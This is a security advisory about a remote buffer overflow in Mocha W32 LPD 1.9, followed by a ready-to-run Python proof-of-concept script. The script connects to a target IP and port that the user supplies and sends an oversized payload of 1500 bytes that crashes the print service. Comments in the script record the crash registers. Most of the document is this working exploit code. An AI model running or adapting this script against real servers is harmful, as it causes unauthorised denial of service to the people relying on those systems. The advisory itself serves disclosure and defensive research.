source: http://www.securityfocus.com/bid/39498/info

Mocha W32 LPD is prone to a remote buffer-overflow vulnerability because the software fails to perform adequate boundary checks on user-supplied data.

Successful exploits may allow attackers to execute arbitrary code with the privileges of the user running the affected application. Failed exploit attempts will result in a denial-of-service condition.

This issue affects W32 LPD 1.9; other versions may be vulnerable as well. 

#!/usr/bin/python
# #################################################################
# Mocha LPD v1.9 Remote Buffer Overflow DoS PoC
# Author: mr_me
# Software Link: http://mochasoft.dk/lpd.htm
# Version: 1.9
# Tested on: Windows XP SP3
# Advisory: http://www.corelan.be:8800/advisories.php?id=10-023
# Greetz to: Corelan Security Team
# http://www.corelan.be:8800/index.php/security/corelan-team-members/
# ##################################################################
# Script provided 'as is', without any warranty.
# Use for educational purposes only.
# Do not use this code to do anything illegal !
# Corelan does not want anyone to use this script
# for malicious and/or illegal purposes.
# Corelan cannot be held responsible for any illegal use.
#
# Note : you are not allowed to edit/modify this code. 
# If you do, Corelan cannot be held responsible for any damages.
# ##################################################################
# Access violation here:
# MOV ECX,DWORD PTR DS:[EBX]
#
# The registers:
# EAX 00A2F978 ASCII "aaaaaaaaaaaaaaaaaaaaaaaaaaaa"..
# ECX 00006161
# EDX 00A20168
# EBX 61616161
# ESP 0012F4B8
# EBP 0012F6D4
# ESI 00A2F970 ASCII "aaaaaaaaaaaaaaaaaaaaaaaaaaaa"..
# EDI 61616161
# EIP 7C91AB8E ntdll.7C91AB8E
 
import sys, socket
 
print "********************************************************"
print "          Mocha LPD Buffer Overflow DoS"
print "                     by mr_me"
print "     http://net-ninja.net/ - mr_me(AT)corelan.be"
print "********************************************************"
 
if len(sys.argv) < 3:
    print "Usage: " + sys.argv[0] + " <target ip> <port>"
    sys.exit(0)
 
exploit = '\x05\x64\x65\x66\x61\x75\x6c\x74\x20'
exploit = '\x41' * 1500
exploit += '\x20\x61\x6c\x6c\x0a'
 
host = sys.argv[1]
port = int(sys.argv[2])
 
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
try:
    connect = s.connect((host,port))
except:
    print "[-] Cant connect!"
 
s.send("\x02")
print "[+] Sending evil payload.. ph33r o.O"
s.send(exploit)
print '[+] Server DoSed!'
s.close()